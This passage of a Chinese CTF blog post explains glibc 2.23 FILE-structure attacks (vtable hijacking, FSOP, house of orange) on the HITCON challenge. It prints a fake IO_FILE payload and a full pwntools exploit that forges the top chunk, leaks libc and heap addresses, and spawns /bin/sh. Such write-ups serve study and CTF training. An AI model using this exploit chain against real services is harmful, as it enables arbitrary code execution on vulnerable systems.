class="type">long</span>)ptr+<span class="number">0x100</span>+<span class="number">24</span>)=<span class="number">0x41414141</span>;</span><br><span class="line"></span><br><span class="line">    list_all_ptr=(<span class="type">long</span> <span class="type">long</span> *)_IO_list_all;</span><br><span class="line"></span><br><span class="line">    list_all_ptr[<span class="number">0</span>]=ptr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/2.png" style="zoom:50%;">
+
+<p>满足<code>fp-&gt;_mode &lt;= 0</code>并且<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></p>
+<img src="/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/3.png" style="zoom:50%;">
+
+<p>最终程序被成功执行到0x41414141</p>
+<img src="/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/4.png" style="zoom:50%;">
+
+<h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><p>这里拿hitcon-house of orange题目来理解2.23对io的攻击，漏洞点发生在upgrade的时候，可以重新生成大小造成堆溢出</p>
+<img src="/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/5.png" style="zoom:50%;">
+
+<p>我们需要先拿到libc，分析了一下发现并没有delete函数，不能直接对堆块进行释放</p>
+<p>因为可以溢出到top_chunk这里，而top_chunk可以进入unsorted bin，前提是其它的bins都不能满足分配的要求，此时会试图利用top_chunk进行分配，假如top_chunk也不能分配则调用如下的sysmalloc来进行分配</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">          <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          </span><br></pre></td></tr></tbody></table></figure>
+
+<p>堆有mmap和brk分配，malloc小于128k的内存（mp_.mmap_threshold），使用brk分配内存</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">     || ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (mp_.mmap_threshold)</span><br><span class="line">  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br></pre></td></tr></tbody></table></figure>
+
+<p>同时还需要满足以下条件</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">          prev_inuse (old_top) &amp;&amp;</span><br><span class="line">          ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<ol>
+<li>伪造的 size 必须要对齐到内存页</li>
+<li>size 要大于 MINSIZE(0x10)</li>
+<li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li>
+<li>size 的 prev inuse 位必须为 1</li>
+</ol>
+</blockquote>
+<p>之后原有的 top chunk 就会执行<code>_int_free</code>从而顺利进入 unsorted bin 中，我们就可以获得libc地址</p>
+<img src="/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/6.png" alt="6" style="zoom:50%;">
+
+<p>在这题中<code>0x0000000000020fa0 + 0x55555575a060 = 0x55555577b000</code>满足对齐到内存页(4kb)，但是我们最大只能创建0x1000大小的堆块，所以我们可以将top_chunk的size改为<code>0x0000000000000fa0 + 0x55555575a060 = 0x55555575b000</code>也对齐到内存页</p>
+<p>然后malloc 0x10000即可将top_chunk放入unsortedbin中，接着再申请一个large bin因为它的fd_nextsize和bk_nextsize中指向自身。这样就可以拿到libc和heap_addr，拿到libc之后接下来就是FSOP的利用</p>
+<p>现在需要控制<code>_IO_list_all</code>到可控的地址，unsortedbin中控制地址的方法有unsorted bin attack，将bk设置为<code>_IO_list_all - 0x10</code></p>
+<p>这样的话<code>_IO_list_all</code>的地址就会被改成main_arena + 0x58（具体原因去看unsorted bin attack）这里不多说</p>
+<p>这样之后main_arena + 0x58我们并不能完全控制，所以看一下_chain字段这里我们可不可以控制，假如可以控制的话就可以把下一个<code>IO_file_plus</code>给申请到之前泄露的堆上</p>
+<p>看一下_chain字段在<code>IO_file_plus</code>中的的偏移</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0</span>   _flags</span><br><span class="line"><span class="number">0x8</span>   _IO_read_ptr</span><br><span class="line"><span class="number">0x10</span>  _IO_read_end</span><br><span class="line"><span class="number">0x18</span>  _IO_read_base</span><br><span class="line"><span class="number">0x20</span>  _IO_write_base</span><br><span class="line"><span class="number">0x28</span>  _IO_write_ptr</span><br><span class="line"><span class="number">0x30</span>  _IO_write_end</span><br><span class="line"><span class="number">0x38</span>  _IO_buf_base</span><br><span class="line"><span class="number">0x40</span>  _IO_buf_end</span><br><span class="line"><span class="number">0x48</span>  _IO_save_base</span><br><span class="line"><span class="number">0x50</span>  _IO_backup_base</span><br><span class="line"><span class="number">0x58</span>  _IO_save_end</span><br><span class="line"><span class="number">0x60</span>  _markers</span><br><span class="line"><span class="number">0x68</span>  _chain</span><br><span class="line"><span class="number">0x70</span>  _fileno</span><br><span class="line"><span class="number">0x74</span>  _flags2</span><br><span class="line"><span class="number">0x78</span>  _old_offset</span><br><span class="line"><span class="number">0x80</span>  _cur_column</span><br><span class="line"><span class="number">0x82</span>  _vtable_offset</span><br><span class="line"><span class="number">0x83</span>  _shortbuf</span><br><span class="line"><span class="number">0x88</span>  _lock</span><br><span class="line"><span class="number">0x90</span>  _offset</span><br><span class="line"><span class="number">0x98</span>  _codecvt</span><br><span class="line"><span class="number">0xa0</span>  _wide_data</span><br><span class="line"><span class="number">0xa8</span>  _freeres_list</span><br><span class="line"><span class="number">0xb0</span>  _freeres_buf</span><br><span class="line"><span class="number">0xb8</span>  __pad5</span><br><span class="line"><span class="number">0xc0</span>  _mode</span><br><span class="line"><span class="number">0xc4</span>  _unused2</span><br><span class="line"><span class="number">0xd8</span>  vtable</span><br></pre></td></tr></tbody></table></figure>
+
+<p>从上面看到是0x68，所以可得<code>0x58 + 0x68 = 0xc0</code>，main_arena + 0xc0是small bin的头地址</p>
+<p>我们可以将unsortedbin的那个size改为0x60，当调用malloc的时候，由于0x60是small bin的范围，会被放入small bin中所以那个unsortedbin的堆块的地址就会变成small bin的头地址，所以main_arena + 0xc0就会被改成unsortedbin那个堆块的地址</p>
+<img src="/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/7.png" style="zoom:50%;">
+
+<p>现在我们已经控制了<code>IO_file_plus</code>，我们接下来就可以伪造iofile了，要满足<code>fp-&gt;_mode &lt;= 0</code>并且<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>，给出如下fake io</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p2 = p64(system_addr) * <span class="number">4</span> + b<span class="number">'</span>\x00<span class="number">'</span> * <span class="number">0x400</span></span><br><span class="line">p2 += b<span class="number">'</span>/bin/sh\x00<span class="number">'</span> + p64(<span class="number">0x61</span>) + p64(<span class="number">0</span>) + p64(io_list_all - <span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x1</span>) + b<span class="number">'</span>\x00<span class="number">'</span> * <span class="number">0xa8</span> + p64(heap_addr)</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>/bin/sh\x00</code>被放到了<code>IO_file_plus</code>的头，vtable则被劫持到了heap_addr，在heap_addr那里布置system_addr，然后触发<code>_IO_flush_all_lockp</code>即可getshell，看到这里还蒙的话需要再去仔细学学io的调用链，exp如下</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./z1r0'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'Your choice : '</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, name, price</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Length of name :'</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">'Name :'</span>, name)</span><br><span class="line">    r.sendlineafter(<span class="string">'Price of Orange:'</span>, <span class="built_in">str</span>(price))</span><br><span class="line">    r.sendlineafter(<span class="string">'Color of Orange:'</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size, name, price</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Length of name :'</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">'Name:'</span>, name)</span><br><span class="line">    r.sendlineafter(<span class="string">'Price of Orange: '</span>,<span class="built_in">str</span>(price))</span><br><span class="line">    r.sendlineafter(<span class="string">'Color of Orange: '</span>,<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'aaaaa'</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">p1 = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0xfa1</span>)</span><br><span class="line">edit(<span class="number">0xff</span>, p1, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">'aaaaa'</span>, <span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">'a'</span> * <span class="number">8</span>, <span class="number">0x20</span>)</span><br><span class="line">show()</span><br><span class="line">malloc_hook = u64(r.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">1640</span> - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">li(<span class="string">'malloc_hook = '</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">li(<span class="string">'libc_base = '</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">li(<span class="string">'system_addr = '</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">io_list_all = libc_base + libc.sym[<span class="string">"_IO_list_all"</span>]</span><br><span class="line">li(<span class="string">'io_list_all = '</span> + <span class="built_in">hex</span>(io_list_all))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x10</span>, <span class="string">'a'</span> * <span class="number">0x10</span>, <span class="number">0x20</span>)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x10</span>)</span><br><span class="line">heap_addr = u64(r.recvuntil(<span class="string">'\n'</span>).strip().ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'heap_addr = '</span> + <span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">p2 = p64(system_addr) * <span class="number">4</span> + <span class="string">b'\x00'</span> * <span class="number">0x400</span></span><br><span class="line">p2 += <span class="string">b'/bin/sh\x00'</span> + p64(<span class="number">0x61</span>) + p64(<span class="number">0</span>) + p64(io_list_all - <span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x1</span>) + <span class="string">b'\x00'</span> * <span class="number">0xa8</span> + p64(heap_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="built_in">len</span>(p2), p2, <span class="number">0x20</span>)</span><br><span class="line">r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+
+
+
+
+
+
+</font>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E3%80%81FSOP%E3%80%81house-of-orange"><span class="toc-number">1.</span> <span class="toc-text">IO_FILE-2.23劫持vtable、FSOP、house of orange</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#vtable%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">vtable劫持原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FSOP"><span class="toc-number">1.2.</span> <span class="toc-text">FSOP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-orange"><span class="toc-number">1.3.</span> <span class="toc-text">house of orange</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/&amp;text=IO_FILE-2.23劫持vtable、FSOP、house of orange"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/&amp;title=IO_FILE-2.23劫持vtable、FSOP、house of orange"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/&amp;is_video=false&amp;description=IO_FILE-2.23劫持vtable、FSOP、house of orange"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=IO_FILE-2.23劫持vtable、FSOP、house of orange&amp;body=Check out this article: http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/&amp;title=IO_FILE-2.23劫持vtable、FSOP、house of orange"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/&amp;title=IO_FILE-2.23劫持vtable、FSOP、house of orange"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/&amp;title=IO_FILE-2.23劫持vtable、FSOP、house of orange"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/&amp;title=IO_FILE-2.23劫持vtable、FSOP、house of orange"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/&amp;name=IO_FILE-2.23劫持vtable、FSOP、house of orange&amp;description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/&amp;t=IO_FILE-2.23劫持vtable、FSOP、house of orange"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright ©
+    
+    
+    2021-2023
+    z1r0
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+
+<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
